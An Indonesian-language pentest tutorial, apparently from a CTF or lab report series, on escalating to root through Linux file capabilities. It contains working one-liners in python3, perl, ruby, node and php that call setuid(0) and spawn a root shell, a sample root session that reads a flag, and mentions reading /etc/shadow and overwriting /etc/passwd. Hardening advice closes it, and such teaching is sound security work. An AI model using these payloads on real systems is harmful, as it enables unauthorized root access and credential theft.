# Exploiting Capabilities (Linux Capabilities Privilege Escalation)

> **Tujuan:** Memanfaatkan binary dengan **Linux capabilities** berbahaya (misal `cap_setuid`) untuk memperoleh **shell sebagai root** — tanpa perlu SUID bit maupun sudo.

---

## Penjelasan Singkat

**Linux Capabilities** memecah privilege root menjadi unit-unit granular yang dapat ditempelkan pada binary. Capability seperti `cap_setuid` memungkinkan proses **mengubah uid-nya sendiri menjadi 0 (root)** — artinya binary ber-capability dapat spawn root shell tanpa perlu SUID bit maupun sudo.

| Item | Detail |
|------|--------|
| **Cara Deteksi** | `getcap -r / 2>/dev/null` |
| **Ciri Khas** | Capability menempel pada binary (`python3 cap_setuid=ep`) |
| **Hasil Eksploitasi** | Shell dengan `uid=0(root)` |

> **Suffix Capability:** `=ep` berarti *effective* + *permitted*. Suffix `e` (effective) membuat capability langsung aktif saat binary dieksekusi.

---

## Cek Hak Capabilities

```bash
getcap -r / 2>/dev/null
# Mencari semua binary yang memiliki Linux capabilities
```

Tampilan **aman** (tidak ada capability berbahaya):

```text
tester@webserver:~$ getcap -r / 2>/dev/null
tester@webserver:~$
```

> Tidak ada output — tidak ada binary dengan capability khusus, konfigurasi bersih.

Tampilan **rentan** (ada capability berbahaya):

```text
www-data@jobportal:~$ getcap -r / 2>/dev/null

# --- cap_setuid (spawn root shell) ---
/usr/bin/python3 cap_setuid=ep             ← RENTAN! os.setuid(0) + exec shell
/usr/bin/perl cap_setuid=ep                ← RENTAN! setuid(0) + exec shell
/usr/bin/ruby cap_setuid=ep                ← RENTAN! Process.setuid(0) + exec
/usr/bin/node cap_setuid=ep                ← RENTAN! process.setuid(0) + spawn
/usr/bin/php cap_setuid=ep                 ← RENTAN! posix_setuid(0) + pcntl_exec

# --- cap_dac_read_search (baca file apa pun, tanpa shell) ---
/usr/bin/cat cap_dac_read_search=ep        ← RENTAN! baca file apa pun
/usr/bin/cp cap_dac_read_search=ep         ← RENTAN! salin file apa pun
```

> **Catatan:** Fokus utama adalah interpreter dengan `cap_setuid` — langsung memberi root shell. `cap_dac_read_search` tidak memberi shell, tapi cukup untuk membaca flag langsung tanpa shell. Capability lain seperti `cap_setgid`, `cap_sys_ptrace` tetap berbahaya — daftar lengkapnya di GTFOBins → bagian **Capabilities**. `lua` sengaja tidak didaftarkan karena tidak bisa memanggil `setuid(0)` — capability tidak diwarisi proses child saat exec (berbeda dengan euid pada SUID).

Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID → [SUID.md](SUID.md)
- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
- `getcap -r / 2>/dev/null` → enumerasi capabilities (vektor file ini)

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.

---

## Cek GTFOBins

Untuk tiap binary ber-capability → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **Capabilities** untuk melihat apakah binary tersebut dapat disalahgunakan.

---

## Contoh Eksploitasi — cap_setuid

```bash
# cap_setuid pada python — spawn root shell
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'

# cap_setuid pada perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'

# cap_setuid pada ruby
ruby -e 'Process.setuid(0); exec "/bin/sh"'

# cap_setuid pada node
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'

# cap_setuid pada php
php -r 'posix_setuid(0); pcntl_exec("/bin/sh", ["-p"]);'
```

| Binary | Capability | Teknik |
|--------|------------|--------|
| `python3` | `cap_setuid=ep` | `os.setuid(0)` + `execl("/bin/sh")` |
| `perl` | `cap_setuid=ep` | `setuid(0)` + `exec "/bin/sh"` |
| `ruby` | `cap_setuid=ep` | `Process.setuid(0)` + `exec` |
| `node` | `cap_setuid=ep` | `setuid(0)` + `spawn("/bin/sh")` |
| `php` | `cap_setuid=ep` | `posix_setuid(0)` + `pcntl_exec("/bin/sh")` |


---

## Contoh Eksploitasi — cap_dac_read_search (Tanpa Shell)

```bash
getcap /usr/bin/cat   # → cat cap_dac_read_search=ep
cat /root/flag.txt    # → bisa baca langsung walau bukan root
```

| Binary | Capability | Teknik |
|--------|------------|--------|
| `cat` | `cap_dac_read_search=ep` | Baca berkas apa pun tanpa shell |
| `cp` | `cap_dac_read_search=ep` | Salin berkas apa pun walau bukan root |

> `cap_setuid` mengubah uid proses menjadi 0 (root) — cukup panggil `setuid(0)` dari interpreter lalu spawn shell. Sementara `cap_dac_read_search` cukup untuk **membaca berkas apa pun** (misal flag) tanpa perlu shell sama sekali.

---

## Contoh Tampilan Eksploitasi (Root Shell)

```text
www-data@jobportal:~$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ cat /root/flag.txt
FLAG{cap_setuid_python_to_root}
```

> **Capture:** Eksploitasi berhasil — `cap_setuid` memungkinkan Python memanggil `setuid(0)` sehingga shell berjalan penuh sebagai `uid=0(root)` tanpa SUID bit maupun sudo.

Versi tanpa shell untuk `cap_dac_read_search`:

```text
www-data@jobportal:~$ getcap /usr/bin/cat
/usr/bin/cat cap_dac_read_search=ep
www-data@jobportal:~$ cat /root/flag.txt
FLAG{dac_read_search_no_shell_needed}
```

> **Capture:** Dengan `cap_dac_read_search`, flag dapat dibaca **langsung tanpa shell** — permission berkas apa pun bisa dilewati.

---

## Capabilities Lain yang Perlu Diwaspadai

| Capability | Dampak | Contoh Eksploitasi |
|------------|--------|--------------------|
| `cap_setgid` | Ganti gid ke grup mana pun (misal `shadow`) | Baca `/etc/shadow` |
| `cap_dac_override` | Tulis/ubah berkas apa pun | Timpa `/etc/passwd` |
| `cap_net_raw` | Craft paket mentah | Sniffing / spoofing jaringan |
| `cap_sys_admin` | Hampir setara admin | Mount, namespace, ptrace |
| `cap_sys_ptrace` | Inject kode ke proses root | Hijack proses berprivilege tinggi |

---

## Alur Eksploitasi

```text
getcap -r /
    ↓
Identifikasi capability berbahaya
    ↓
Cek GTFOBins → Capabilities
    ↓
Pilih interpreter yang sesuai
    ↓
Uji payload setuid(0) / spawn shell
    ↓
Verifikasi privilege dengan id
```

---

## Pengerasan Keamanan (Hardening)

- **Setel Ulang Capabilities** Hapus capability berbahaya dengan `setcap -r <binary>` dan batasi hanya untuk binary yang benar-benar membutuhkan.
- **Batas Wajar Penggunaan** Berikan capability spesifik alih-alih root penuh — misal `cap_net_raw` untuk ping, jangan `cap_setuid` pada interpreter.
- **Audit Rutin** Lakukan audit berkala dengan `getcap -r /` dan pastikan tidak ada capability berbahaya menempel pada interpreter.
- **Hindari Interpreter** Jangan tempelkan `cap_setuid`/`cap_dac_override` pada interpreter (python, perl, ruby, node) karena semuanya bisa spawn shell.

---

## Checklist Capabilities LPE

- [ ] Jalankan `getcap -r / 2>/dev/null`.
- [ ] Identifikasi capability berbahaya (`cap_setuid`, `cap_dac_read_search`, `cap_dac_override`).
- [ ] Cek di [GTFOBins](https://gtfobins.github.io) → bagian **Capabilities**.
- [ ] Pilih payload shell yang sesuai dengan interpreter yang ditemukan.
- [ ] Verifikasi dengan `id` → `uid=0(root)`.

---

## Referensi

- [GTFOBins – Capabilities](https://gtfobins.github.io/)
- [Linux Man Page – capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)